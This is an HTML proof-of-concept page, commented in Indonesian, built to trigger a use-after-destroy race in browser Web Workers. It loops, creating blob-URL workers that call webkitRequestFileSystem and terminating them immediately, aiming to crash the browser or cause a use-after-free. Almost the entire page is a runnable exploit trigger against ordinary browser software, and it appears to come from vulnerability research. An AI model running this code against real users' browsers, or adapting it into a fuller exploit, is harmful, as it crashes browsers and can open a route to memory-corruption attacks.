<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Worker FileSystem Use-After-Destroy PoC</title>
    <style>
        body { font-family: 'Consolas', monospace; padding: 20px; background: #1a1a2e; color: #eee; }
        #log { background: #0f0f23; border: 1px solid #444; height: 400px; overflow-y: scroll; padding: 10px; font-size: 11px; white-space: pre-wrap; }
        .info { color: #00d4ff; }
        .warn { color: #ffaa00; }
        .error { color: #ff4444; }
        .success { color: #00ff88; }
        button { padding: 10px 20px; margin: 5px; cursor: pointer; font-weight: bold; border: none; border-radius: 4px; }
        #btnStart { background: #006400; color: white; }
        #btnStop { background: #8b0000; color: white; }
        #btnClear { background: #333; color: #ccc; }
        .stats { margin: 10px 0; padding: 10px; background: #252540; border-radius: 4px; }
    </style>
</head>
<body>

    <h2>üî¨ WorkerGlobalScope FileSystem UaD PoC</h2>
    <p>Trigger: <code>webkitRequestFileSystem</code> in Worker + Immediate <code>worker.terminate()</code></p>
    
    <div>
        <button id="btnStart" onclick="startAttack()">‚ñ∂ Start Race Loop</button>
        <button id="btnStop" onclick="stopAttack()">‚èπ Stop</button>
        <button id="btnClear" onclick="clearLog()">üóë Clear Log</button>
    </div>
    
    <div class="stats">
        Iterations: <span id="count">0</span> | 
        Status: <span id="status" class="warn">IDLE</span> | 
        Target API: <code>webkitRequestFileSystem</code> (Async)
    </div>
    
    <div id="log"></div>

    <!-- Inline Worker Script (Blob) -->
    <script id="worker-code" type="javascript/worker">
        // Kode ini akan dieksekusi DI DALAM Worker Global Scope
        self.onmessage = function(e) {
            const { action, quota } = e.data;
            
            if (action === 'attack') {
                // 1. Minta quota dulu agar operasi filesystem benar-benar terjadi (IPC)
                if (self.webkitPersistentStorage) {
                    self.webkitPersistentStorage.requestQuota(quota, function(granted) {
                        // 2. Panggil API async yang rentan
                        // Callback C++ DidOpenFileSystem akan dipanggil nanti via task queue
                        self.webkitRequestFileSystem(
                            self.TEMPORARY, 
                            1024, 
                            function success(fs) {
                                // ‚ö†Ô∏è RACE CONDITION ZONE:
                                // Jika worker sudah terminate saat callback ini dipanggil,
                                // ExecutionContext sudah invalid ‚Üí Crash/UAF
                                self.postMessage({ type: 'callback-fired', name: fs ? fs.name : 'null' });
                            }, 
                            function error(err) {
                                self.postMessage({ type: 'callback-error', code: err.code });
                            }
                        );
                    }, function(err) {
                        // Jika request quota gagal, tetap coba call filesystem langsung
                        triggerFileSystem();
                    });
                } else {
                    triggerFileSystem();
                }
            }
            
            function triggerFileSystem() {
                self.webkitRequestFileSystem(
                    self.TEMPORARY, 1024,
                    function(fs) { self.postMessage({type:'cb', ok:true}); },
                    function(e) { self.postMessage({type:'cb', ok:false}); }
                );
            }
        };
    </script>

    <script>
        const logDiv = document.getElementById('log');
        const countSpan = document.getElementById('count');
        const statusSpan = document.getElementById('status');
        let isRunning = false;
        let iteration = 0;
        let workerBlob = null;
        let WorkerURL = null;

        function log(msg, cls = 'info') {
            const line = document.createElement('div');
            line.className = cls;
            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logDiv.appendChild(line);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function clearLog() {
            logDiv.innerHTML = '';
            iteration = 0;
            countSpan.textContent = '0';
        }

        function startAttack() {
            if (isRunning) return;
            isRunning = true;
            statusSpan.textContent = 'RACING...';
            statusSpan.className = 'success';
            document.getElementById('btnStart').disabled = true;
            
            // Buat Blob URL untuk inline worker (lebih cepat dari file eksternal)
            if (!WorkerURL) {
                const workerCode = document.getElementById('worker-code').textContent;
                workerBlob = new Blob([workerCode], { type: 'application/javascript' });
                WorkerURL = URL.createObjectURL(workerBlob);
            }
            
            log("Starting Worker FileSystem Race Loop...", "warn");
            loopAttack();
        }

        function stopAttack() {
            isRunning = false;
            statusSpan.textContent = 'STOPPED';
            statusSpan.className = 'error';
            document.getElementById('btnStart').disabled = false;
            log("Attack stopped by user.", "error");
        }

        async function loopAttack() {
            while (isRunning) {
                iteration++;
                countSpan.textContent = iteration;
                
                // 1. Buat worker baru setiap iterasi (ExecutionContext baru)
                const worker = new Worker(WorkerURL);
                
                // 2. Setup listener untuk callback dari worker (jika sempat jalan)
                worker.onmessage = (e) => {
                    const data = e.data;
                    if (data.type === 'callback-fired') {
                        log(`‚ö†Ô∏è Callback fired after terminate?! FS: ${data.name}`, "error");
                    }
                };
                
                worker.onerror = (e) => {
                    // Error dari worker yang sudah terminate adalah hal yang diharapkan
                    // log(`Worker error: ${e.message}`, "info");
                };
                
                // 3. Kirim perintah attack ke worker
                worker.postMessage({ action: 'attack', quota: 10 * 1024 * 1024 });
                
                // 4. ‚ö° THE KILL: Terminate worker SEGERA setelah posting message
                // Ini memicu teardown WorkerGlobalScope sebelum async IPC selesai
                worker.terminate();
                
                if (iteration % 100 === 0) {
                    log(`Iteration ${iteration}... still racing`, "info");
                }
                
                // Yield ke event loop agar UI tetap responsif dan race lebih natural
                await new Promise(resolve => setTimeout(resolve, 0));
            }
        }

        // Cleanup saat halaman unload
        window.addEventListener('beforeunload', () => {
            if (WorkerURL) URL.revokeObjectURL(WorkerURL);
        });
    </script>
</body>
</html>
